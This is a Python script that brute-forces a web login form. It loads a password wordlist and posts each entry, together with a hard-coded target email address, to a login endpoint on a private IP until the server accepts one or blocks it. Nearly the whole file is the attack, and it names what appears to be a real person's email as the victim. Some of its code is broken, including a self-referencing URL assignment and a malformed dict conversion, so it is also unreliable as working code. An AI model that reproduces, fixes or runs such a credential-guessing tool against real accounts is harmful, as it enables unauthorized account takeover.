import socket
import requests
from functions.log import forbidden_log, rich_log

# =============================================================== 
# ================== store passwords in buffer ================== 
# =============================================================== 
passwords: list[str] = []

def save_pass_buffer():    
    with open("password_list/passwords.txt", "r", encoding="utf-8", errors="replace") as f:
        data = f.readlines()
        passwords.extend(data)

# ===============================================================
# ================== start the requests ========================= 
# ===============================================================

url = "http://192.168.29.42:8080/login/"
headers = {
  'Content-Type': 'application/x-www-form-urlencoded',
  
}

def send_login_request(*, email: str):
    # url = input("enter target IP address: ")
    
    url = f"http://{url}:8080/login/"
    
    for password_buffer in passwords:
        password = password_buffer.strip()

        payload = f'email={email}&password={password}'
        payload = payload.replace("@", "%40")

        response = requests.request("POST", url, headers=headers, data=payload)
        if response.status_code == 200:
            rich_log(email, password, ok=True)
            break
        elif response.status_code == 403:
            forbidden_log(ip=dict(response.content).get("ip"))
            break
        else:
            rich_log(email, password, ok=False)


def start(*, email: str):
    save_pass_buffer()
    send_login_request(email=email)


if __name__ == "__main__":
    start(email="ram19870101@gmail.com")



